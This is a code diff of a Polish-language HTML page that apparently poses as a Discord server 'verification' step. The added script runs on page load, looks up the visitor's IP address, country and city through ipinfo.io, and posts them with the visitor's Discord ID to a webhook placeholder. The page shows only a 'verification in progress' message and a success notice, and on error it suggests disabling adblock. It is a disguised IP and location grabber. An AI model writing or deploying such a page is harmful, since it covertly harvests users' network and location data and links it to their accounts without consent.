@@ -10,76 +10,75 @@
             background-color: #36393f;
             color: white;
         }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #5865F2;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .error {
+            color: #ff4444;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <div id="status">
-        <div class="loader"></div>
-        <p>Trwa weryfikacja, proszę czekać...</p>
+        <h1>Trwa weryfikacja...</h1>
     </div>
 
     <script>
-        async function verifyUser() {
+        async function verify() {
+            const statusElement = document.getElementById('status');
+            
             try {
-                // Pobierz ID użytkownika z URL
+                // 1. Pobierz ID użytkownika
                 const urlParams = new URLSearchParams(window.location.search);
                 const userId = urlParams.get('user');
                 
                 if (!userId) {
-                    throw new Error("Brak ID użytkownika w URL");
+                    throw new Error("Brak ID użytkownika w adresie URL");
                 }
 
-                // Pobierz dane lokalizacji
+                // 2. Pobierz dane lokalizacji
                 const ipResponse = await fetch('https://ipinfo.io/json');
+                if (!ipResponse.ok) {
+                    throw new Error("Nie udało się pobrać danych lokalizacji");
+                }
                 const ipData = await ipResponse.json();
-                
-                // Przygotuj dane do wysłania
-                const verificationData = {
-                    discord_id: userId,
-                    ip: ipData.ip || "Nieznane",
-                    country: ipData.country || "Nieznany",
-                    city: ipData.city || "Nieznane"
-                };
 
-                // Wyślij dane na endpoint Twojego bota (zamiast webhooka)
-                const botResponse = await fetch('https://twój-serwer.com/api/verify', {
+                // 3. Wyślij dane na webhook
+                const webhookResponse = await fetch('TWÓJ_WEBHOOK_DISCORD', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(verificationData)
+                    body: JSON.stringify({
+                        content: `Weryfikacja użytkownika <@${userId}>`,
+                        embeds: [{
+                            fields: [
+                                { name: "IP", value: ipData.ip || "Nieznane" },
+                                { name: "Kraj", value: ipData.country || "Nieznany" },
+                                { name: "Miasto", value: ipData.city || "Nieznane" }
+                            ],
+                            color: 0x5865F2
+                        }]
+                    })
                 });
 
-                if (!botResponse.ok) {
-                    throw new Error("Błąd podczas wysyłania danych do bota");
+                if (!webhookResponse.ok) {
+                    throw new Error("Błąd podczas wysyłania danych do Discord");
                 }
 
-                document.getElementById('status').innerHTML = `
-                    <h2 style="color: #00ff00;">✅ Weryfikacja zakończona!</h2>
-                    <p>Rola zostanie nadana automatycznie.</p>
+                // 4. Potwierdzenie sukcesu
+                statusElement.innerHTML = `
+                    <h1 style="color: #00ff00;">✅ Weryfikacja zakończona!</h1>
                     <p>Możesz zamknąć tę stronę.</p>
                 `;
             } catch (error) {
-                document.getElementById('status').innerHTML = `
-                    <h2 style="color: #ff0000;">❌ Błąd weryfikacji!</h2>
+                statusElement.innerHTML = `
+                    <h1 style="color: #ff0000;">❌ Błąd weryfikacji!</h1>
                     <p>${error.message}</p>
-                    <p>Odśwież stronę i spróbuj ponownie.</p>
+                    <p class="error">Porada: Spróbuj wyłączyć adblock i odśwież stronę</p>
                 `;
+                console.error("Szczegóły błędu:", error);
             }
         }
 
-        window.onload = verifyUser;
+        // Uruchom weryfikację
+        verify();
     </script>
 </body>
 </html>
